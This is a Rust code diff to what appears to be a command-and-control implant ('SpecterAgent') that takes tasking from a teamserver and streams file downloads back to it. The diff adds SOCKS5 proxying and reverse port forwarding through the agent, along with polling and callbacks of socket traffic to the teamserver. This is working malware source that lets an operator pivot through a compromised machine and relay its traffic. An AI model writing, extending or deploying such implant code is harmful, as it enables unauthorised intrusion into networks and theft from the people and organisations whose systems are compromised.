@@ -14,6 +14,7 @@ use crate::error::SpecterError;
 use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack, parse_tasking_response,
 };
+use crate::socket::SocketState;
 use crate::token::TokenVault;
 use crate::transport::HttpTransport;
 
@@ -34,6 +35,8 @@ pub struct SpecterAgent {
     token_vault: TokenVault,
     /// Active file downloads being streamed back to the teamserver.
     downloads: DownloadTracker,
+    /// Socket state for SOCKS5 proxy and reverse port forwarding.
+    socket_state: SocketState,
 }
 
 impl SpecterAgent {
@@ -66,6 +69,7 @@ impl SpecterAgent {
             ctr_offset: 0,
             token_vault: TokenVault::new(),
             downloads: DownloadTracker::new(),
+            socket_state: SocketState::new(),
         })
     }
 
@@ -183,6 +187,21 @@ impl SpecterAgent {
             };
 
             for package in &message.packages {
+                // CommandSocket requires async I/O — handle it directly rather
+                // than going through the synchronous dispatch() path.
+                if package.command_id == u32::from(DemonCommand::CommandSocket) {
+                    if let Err(e) =
+                        self.socket_state.handle_command(package.request_id, &package.payload).await
+                    {
+                        warn!(
+                            agent_id = format_args!("0x{:08X}", self.agent_id),
+                            error = %e,
+                            "socket command failed"
+                        );
+                    }
+                    continue;
+                }
+
                 let result = dispatch::dispatch(
                     package,
                     &mut self.config,
@@ -192,6 +211,31 @@ impl SpecterAgent {
                 if self.handle_dispatch_result(package.request_id, result).await {
                     // Exit requested — terminate.
                     return Ok(());
+                }
+            }
+
+            // Poll active sockets, listeners, relays, and SOCKS clients.
+            if self.socket_state.has_active_connections() {
+                if let Err(e) = self.socket_state.poll().await {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        error = %e,
+                        "socket poll failed"
+                    );
+                }
+            }
+
+            // Send any pending socket responses back to the teamserver.
+            for resp in self.socket_state.drain_responses() {
+                let req_id = resp.request_id;
+                if let Err(e) = self.send_callback_raw(resp.command_id, req_id, &resp.payload).await
+                {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        command_id = resp.command_id,
+                        error = %e,
+                        "failed to send socket response"
+                    );
                 }
             }
 
@@ -227,9 +271,8 @@ impl SpecterAgent {
                 true
             }
             DispatchResult::Respond(resp) => {
-                if let Err(e) =
-                    self.send_callback_raw(resp.command_id, request_id, &resp.payload).await
-                {
+                let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
+                if let Err(e) = self.send_callback_raw(resp.command_id, rid, &resp.payload).await {
                     warn!(
                         agent_id = format_args!("0x{:08X}", self.agent_id),
                         command_id = resp.command_id,
@@ -241,8 +284,9 @@ impl SpecterAgent {
             }
             DispatchResult::MultiRespond(resps) => {
                 for resp in resps {
+                    let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                     if let Err(e) =
-                        self.send_callback_raw(resp.command_id, request_id, &resp.payload).await
+                        self.send_callback_raw(resp.command_id, rid, &resp.payload).await
                     {
                         warn!(
                             agent_id = format_args!("0x{:08X}", self.agent_id),
